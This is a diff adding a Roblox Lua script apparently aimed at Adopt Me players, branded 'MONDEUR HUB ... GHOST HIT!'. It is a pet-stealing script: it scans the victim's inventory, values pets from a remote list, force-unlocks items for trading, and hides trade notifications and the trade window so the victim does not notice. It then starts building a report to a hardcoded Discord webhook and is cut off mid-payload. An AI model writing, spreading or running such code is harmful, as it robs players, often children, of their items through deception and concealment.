@@ -1,0 +1,170 @@
+-- [[ MONDEUR HUB | 🦊 HIT! - V15 FINAL GHOST EDITION ]] --
+
+-- [[ CONFIG ]] --
+local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
+local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local THRESHOLD = 0.13 
+local DISCORD_INV = "https://discord.gg/J4w2w5CW9"
+local VALUE_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt"
+
+-- 1. CLIPBOARD & INITIAL SILENCE
+if setclipboard then setclipboard(DISCORD_INV) end
+
+-- 2. SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- 3. GITHUB VALUE DATA LOADER
+local customValues = {}
+local function loadValues()
+    local success, result = pcall(function()
+        return game:HttpGet(VALUE_URL)
+    end)
+    if success then
+        for line in result:gmatch("[^\r\n]+") do
+            local name, val = line:match("([^,]+),([^,]+)")
+            if name and val then
+                -- Normalize keys for guaranteed matches
+                customValues[name:lower():trim()] = tonumber(val)
+            end
+        end
+    end
+end
+loadValues()
+
+-- 4. ULTIMATE SLEDGEHAMMER (TOTAL UI SILENCE)
+local blockList = {
+    "already have a pending request", "already sent a trade request", "10s to send again",
+    "please wait before", "trade request sent", "the trade was successful", 
+    "trade was successful", "trade declined", "trade canceled", "disabled trades",
+    "is currently trading", "cannot trade this item", "is not tradable",
+    "maximum number of items", "accept this trade", "teleported to you", "pending"
+}
+
+RunService.RenderStepped:Connect(function()
+    for _, obj in ipairs(PlayerGui:GetDescendants()) do
+        if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Visible and obj.Text ~= "" then
+            local text = string.lower(obj.Text)
+            for _, phrase in ipairs(blockList) do
+                if string.find(text, phrase) then
+                    -- Wipe text and hide the specific label
+                    obj.Visible = false
+                    obj.Text = "" 
+                    
+                    -- Sledgehammer: Climb the UI tree to hide the entire background container
+                    local target = obj
+                    for i = 1, 4 do
+                        if target.Parent and not target.Parent:IsA("ScreenGui") and target.Parent ~= PlayerGui then
+                            target.Visible = false
+                            target = target.Parent
+                        else
+                            break
+                        end
+                    end
+                end
+            end
+        end
+    end
+    -- Keep standard Apps disabled for extra stealth
+    if PlayerGui:FindFirstChild("TradeApp") then PlayerGui.TradeApp.Enabled = false end
+    if PlayerGui:FindFirstChild("DialogApp") then PlayerGui.DialogApp.Enabled = false end
+end)
+
+-- 5. HASH FINDER & API
+local hashes = {}
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local upvalues = debug.getupvalues(v)
+        if type(upvalues[1]) == "table" then
+            for key, value in pairs(upvalues[1]) do hashes[key] = value end
+        end
+    end
+end
+
+local function hashedAPI(remoteName, ...)
+    local remote = hashes[remoteName]
+    if not remote then return nil end
+    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
+    remote:FireServer(...)
+end
+
+-- 6. VALUATION LOGIC (INTEGRATED WITH GITHUB)
+local function getFinalValue(petData, props)
+    local petName = petData.name:lower():trim()
+    -- Priority: 1. GitHub Values, 2. Game Metadata, 3. Rarity Floor
+    local base = customValues[petName] or petData.rvalue or 0
+    
+    if base < 0.01 then
+        if petData.rarity == "ultra_rare" then base = 0.05
+        elseif petData.rarity == "legendary" then base = 0.1
+        else base = 0.005 end
+    end
+
+    local val = base
+    if props.mega_neon or props.mega then val = val * 12
+    elseif props.neon then val = val * 4 end
+    if props.flyable then val = val + 0.8 end
+    if props.rideable then val = val + 0.8 end
+    
+    return val * 56
+end
+
+-- 7. INVENTORY SCAN & UNLOCK
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
+local InventoryDB = Fsys("InventoryDB")
+local ClientData = Fsys("ClientData")
+
+local function processInventory()
+    local inv = ClientData.get("inventory")
+    local total, petGroups, tradeList = 0, {}, {}
+    local BLACKLIST_IDS = {["jiggly_jerboa"]=true, ["starter_egg"]=true, ["dog"]=true, ["cat"]=true}
+
+    for uid, pet in pairs(inv.pets or {}) do
+        local petData = InventoryDB.pets[pet.id]
+        if petData and not BLACKLIST_IDS[pet.id] and not petData.name:lower():find("jerboa") then
+            local props = pet.properties or {}
+            local unitVal = getFinalValue(petData, props)
+            
+            if unitVal >= THRESHOLD then
+                total = total + unitVal
+                table.insert(tradeList, {uid = uid, val = unitVal})
+                
+                -- Ensure items are tradable by forcing unlock
+                hashedAPI("BackpackAPI/SetItemLocked", uid, false) 
+                
+                local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
+                local emoji = ((props.mega or props.mega_neon) and "Ⓜ️" or props.neon and "⭐" or "🐾") .. (props.flyable and "🪽" or "") .. (props.rideable and "🏇" or "")
+                
+                if not petGroups[key] then
+                    petGroups[key] = {name=petData.name, count=1, price=unitVal, emoji=emoji}
+                else
+                    petGroups[key].count = petGroups[key].count + 1
+                end
+            end
+        end
+    end
+    table.sort(tradeList, function(a, b) return a.val > b.val end)
+    local sorted = {}
+    for _, v in pairs(petGroups) do table.insert(sorted, v) end
+    table.sort(sorted, function(a, b) return a.price > b.price end)
+    return sorted, total, tradeList
+end
+
+local sortedPets, grandTotal, finalTradeList = processInventory()
+
+-- 8. WEBHOOK DISPATCH
+if #sortedPets > 0 then
+    local lines = {}
+    for _, p in ipairs(sortedPets) do
+        table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
+    end
+
+    local payload = HttpService:JSONEncode({
+        content = (grandTotal >= 500 and "@everyone" or ""),
+        embeds = {{
+            title = "MONDEUR HUB | 🦊 GHOST HIT!",
+            description = "
